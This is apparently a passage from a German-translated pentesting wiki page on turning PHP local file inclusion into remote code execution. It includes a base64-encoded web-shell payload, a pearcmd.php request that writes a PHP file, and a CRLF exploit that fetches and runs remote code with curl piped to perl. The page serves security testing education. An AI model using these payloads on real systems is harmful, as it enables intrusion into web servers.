### Über php base64 filter (using base64)

Wie in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article gezeigt, ignoriert der PHP base64 filter einfach Nicht-base64. Du kannst das verwenden, um die Dateiendungsprüfung zu umgehen: wenn du base64 lieferst, das mit ".php" endet, würde er den "." einfach ignorieren und "php" an das base64 anhängen. Hier ist ein Beispiel-Payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (keine Datei erforderlich)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) erklärt, dass du **php filters** verwenden kannst, um beliebigen Inhalt als Ausgabe zu erzeugen. Das bedeutet im Grunde, dass du **beliebigen php code** für das include **erzeugen kannst, ohne ihn in eine Datei schreiben zu müssen**.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Lade** eine Datei hoch, die als **temporär** in `/tmp` gespeichert wird; löse dann in der **gleichen Anfrage** einen **segmentation fault** aus — die **temporäre Datei wird nicht gelöscht** und du kannst danach danach danach nach ihr suchen.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Wenn du eine **Local File Inclusion** gefunden hast und **Nginx** vor PHP läuft, könntest du mit der folgenden Technik RCE erlangen:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

Wenn du eine **Local File Inclusion** gefunden hast, selbst wenn du **keine Session** hast und `session.auto_start` auf `Off` steht. Wenn du **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST**-Daten mitsendest, wird PHP die Session **für dich aktivieren**. Das kannst du ausnutzen, um RCE zu bekommen:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Wenn du eine **Local File Inclusion** gefunden hast und der Server unter **Windows** läuft, könntest du RCE erreichen:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), das Script `/usr/local/lib/phppearcmd.php` existiert standardmäßig in php docker images. Außerdem ist es möglich, Argumente per URL an das Script zu übergeben, da angegeben ist, dass ein URL-Parameter ohne `=` als Argument verwendet werden sollte. Siehe auch [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) und [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Die folgende Anfrage erstellt eine Datei in `/tmp/hello.php` mit dem Inhalt `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Im Folgenden wird eine CRLF vuln ausgenutzt, um RCE zu erreichen (aus [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Über phpinfo() (file_uploads = on)

Wenn du eine **Local File Inclusion** gefunden hast und eine Datei, die **phpinfo()** mit file_uploads = on anzeigt, kannst du RCE erlangen:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Über compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Wenn du eine **Local File Inclusion** gefunden hast und du **den Pfad** der temporären Datei exfiltrieren kannst, ABER der **Server** überprüft, ob die **einzubindende Datei PHP-Markierungen** enthält, kannst du versuchen, diese **Prüfung zu umgehen** mit dieser **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Über ewiges Warten + bruteforce

Wenn du das LFI ausnutzen kannst, um **temporäre Dateien hochzuladen** und den Server die PHP-Ausführung **aufhängen** zu lassen, könntest du dann **über Stunden Dateinamen brute-forcen**, um die temporäre Datei zu finden:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Zu einem Fatal Error

Wenn du eine der Dateien `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` einbindest. (Du musst dieselbe Datei 2-mal einbinden, um diesen Fehler auszulösen).

**Ich weiß nicht, wie nützlich das ist, aber es könnte es sein.**\
_Selbst wenn du einen PHP Fatal Error verursachst, werden die hochgeladenen PHP-Temporärdateien gelöscht._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Referenzen

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
